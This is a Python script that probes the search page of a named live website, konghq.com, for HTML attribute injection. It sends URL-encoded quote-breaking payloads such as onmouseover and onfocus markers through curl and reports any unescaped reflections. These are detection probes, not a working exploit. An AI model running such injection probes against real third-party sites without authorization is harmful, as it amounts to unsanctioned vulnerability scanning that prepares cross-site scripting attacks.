import json,re,subprocess
from pathlib import Path
from urllib.parse import quote

BASE='https://konghq.com/search'
payloads=['KONG%22%20data-kong%3D1','KONG%27%20data-kong%3D1','KONG%22%20onmouseover%3D1','KONG%27%20onfocus%3D1','KONG%26quot%3B%20data-kong%3D1']
rows=[]
for enc in payloads:
    url=BASE+'?search='+enc
    p=subprocess.run(['curl','-sS','--max-redirs','0','--connect-timeout','8','--max-time','15','-D','/tmp/h','-o','/tmp/b',url],text=True,capture_output=True)
    h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
    b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
    sts=re.findall(r'^HTTP/[^ ]+\s+(\d+)',h,re.M)
    status=int(sts[-1]) if sts else None
    raw=('%22' in b or '%27' in b or 'data-kong=1' in b or 'onmouseover=1' in b or 'onfocus=1' in b)
    snippets=[]
    for needle in ['KONG','data-kong','onmouseover','onfocus']:
        i=b.find(needle)
        if i>=0: snippets.append(b[max(0,i-250):i+500])
    rows.append({'url':url,'status':status,'length':len(b),'interesting_reflection':raw,'snippets':snippets[:4],'exit_code':p.returncode})
Path('kong-search-context-results.json').write_text(json.dumps(rows,indent=2))
hits=[x for x in rows if x['interesting_reflection'] and x['status']==200]
if hits:
    x=hits[0]
    Path('kong-search-context-report.md').write_text('# POTENTIAL HTML ATTRIBUTE INJECTION\n\nEndpoint: '+x['url'].split('?',1)[0]+'\n\n'+ '\n\n'.join(x['snippets'][:2])+'\n')
else:
    Path('kong-search-context-report.md').write_text('# NO VERIFIED HTML ATTRIBUTE INJECTION\n\nQuote-based probes did not demonstrate an HTML context break.\n')
print(json.dumps({'tested':len(rows),'potential':len(hits)}))